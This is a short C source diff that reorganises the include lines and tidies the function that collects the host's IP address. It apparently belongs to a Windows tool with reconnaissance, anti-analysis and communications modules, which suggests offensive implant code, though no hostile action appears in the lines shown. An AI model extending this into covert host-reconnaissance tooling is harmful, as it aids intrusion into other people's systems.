@@ -1,12 +1,8 @@
+#include "common.h"
 #include "recon.h"
-#include <winsock2.h>
-#include <windows.h>
-#include <tlhelp32.h>
-#include <iphlpapi.h>
-#include <lm.h>
-#include <stdio.h>
 #include "anti_analysis.h"
-#include "ntdefs.h"
+#include "comms.h"
+#include <lm.h>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "iphlpapi.lib")
@@ -128,7 +124,7 @@ static VOID collect_arch(OUT CHAR* buf, DWORD size) {
 }
 
 static VOID collect_ip(OUT CHAR* buf, DWORD size) {
-    extern ULONG GetCurrentIpAddress();
+    ULONG GetCurrentIpAddress();
     struct in_addr a;
     a.s_addr = GetCurrentIpAddress();
     strcpy_s(buf, size, inet_ntoa(a));
